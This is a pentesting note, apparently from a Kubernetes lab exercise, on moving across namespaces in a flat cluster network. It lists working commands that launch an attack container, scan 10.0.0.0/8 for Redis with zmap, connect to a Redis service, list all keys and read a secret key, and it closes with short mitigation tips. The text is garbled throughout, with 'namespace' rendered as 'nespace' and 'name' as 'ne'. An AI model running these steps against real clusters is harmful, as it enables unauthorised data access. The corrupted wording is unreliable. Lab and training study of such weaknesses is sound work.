# Pentesting Note: Kubernetes nespace Bypasses

## Objective
Understand and exploit the default flat networking schema in Kubernetes to access services and pods across different nespaces.

## Background
By default, Kubernetes uses a flat networking schema, meaning any pod/service within the cluster can communicate with others. nespaces within the cluster do not have network security restrictions by default, allowing anyone in one nespace to talk to other nespaces.

### DNS-Based Access
Kubernetes services can also be accessed using their DNS nes:
- Format: `<service-ne>.<nespace>`

### Example Scenario
Accessing the `cache-store-service` in the `secure-middleware` nespace:
- DNS: `cache-store-service.secure-middleware`

## Steps

### 1. Run Hacker Container
Start by running the `hacker-container` in the default nespace to explore the environment:

```sh
kubectl run -it hacker-container --image=madhuakula/hacker-container -- sh
```

### 2. Scan the Cluster with Zmap
Use Zmap to scan the cluster for open ports and services:

```sh
zmap -p 6379 10.0.0.0/8 -o results.csv
```

### 3. Identify the Cache-Store Service
Locate the `cache-store-service` by its IP address.

### 4. Access Services Using DNS
Services in Kubernetes can be accessed using their DNS nes in the format `<service-ne>.<nespace>`. For example, access `cache-store-service` in the `secure-middleware` nespace:

```sh
redis-cli -h cache-store-service.secure-middleware
```

### 5. Interact with Redis Service
Once you have identified the IP address of the service, use a Redis client (`redis-cli`) to interact with the service:

- **Connect to Redis**:
  ```sh
  redis-cli -h 10.12.0.2
  ```

- **Get All Keys**:
  ```sh
  KEYS *
  ```

- **Get Specific Key Information**:
  ```sh
  GET SECRETSTUFF
  ```

### Summary of Commands
```sh
# Run hacker-container in the default nespace
kubectl run -it hacker-container --image=madhuakula/hacker-container -- sh

# Scan the cluster for Redis services on port 6379
zmap -p 6379 10.0.0.0/8 -o results.csv

# Connect to Redis service using IP address
redis-cli -h 10.12.0.2

# Get all available keys in Redis
KEYS *

# Get specific key information
GET SECRETSTUFF
```

### Mitigation Tips
- **Network Policies**: Implement Kubernetes Network Policies to restrict cross-nespace communication.
- **RBAC**: Use Role-Based Access Control to limit access to resources within the cluster.
- **Service Isolation**: Isolate sensitive services in separate nespaces with strict access controls.
- **Monitoring**: Continuously monitor network traffic and logs for suspicious activities.

By following these steps, you can exploit the flat networking schema in Kubernetes to access services and pods across nespaces, aiding in penetration testing efforts.